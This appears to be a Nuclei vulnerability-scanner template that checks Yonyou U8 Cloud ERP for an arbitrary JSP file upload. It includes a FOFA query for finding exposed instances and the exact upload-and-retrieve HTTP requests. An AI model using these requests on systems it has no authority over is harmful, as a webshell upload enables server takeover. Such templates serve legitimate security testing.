id: yonyou-U8clouderp-upload-uploadfile
info:
  author: PokerSec
  metadata:
    fofasearch: "app=\"\u7528\u53CB-U8-Cloud\""
  name: yonyou-U8clouderp-upload-uploadfile
  severity: critical
requests:
- matchers:
  - dsl:
    - status_code==200 && contains_all(body_2,"{{file_content}}")
    type: dsl
  raw:
  - 'POST /linux/pages/upload.jsp HTTP/1.1

    Host: {{Hostname}}

    filename:{{file_name}}.jsp


    {{file_content}}

    '
  - 'GET /linux/{{file_name}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
variables:
  file_content: '{{to_lower(rand_text_alpha(8))}}'
  file_name: '{{to_lower(rand_text_alpha(8))}}'
